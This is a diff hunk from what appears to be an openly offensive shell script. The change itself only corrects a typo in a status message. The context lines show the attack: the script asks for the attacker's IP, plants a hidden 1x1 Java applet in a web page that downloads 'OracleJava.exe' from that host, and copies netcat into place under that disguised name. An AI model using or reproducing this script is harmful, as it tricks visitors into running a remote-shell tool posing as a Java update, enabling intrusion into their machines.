@@ -29,7 +29,7 @@ echo
 printf "\033[1;33m[?] What is Attacker's external IP address?\033[0m\n"
 read address
 echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://$address/OracleJava.exe"></applet>' > /var/www/html/$htmlfiletoembed
-printf "\033[1;33m[Info] Applet embed successfully in $htmlfiletoembed.\033[0m\n"
+printf "\033[1;33m[Info] Applet was embeded successfully in $htmlfiletoembed.\033[0m\n"
 cp /usr/share/windows-binaries/nc.exe /var/www/html/OracleJava.exe
 printf "\033[1;33m[!] ByeBye.\033[0m\n"
 echo
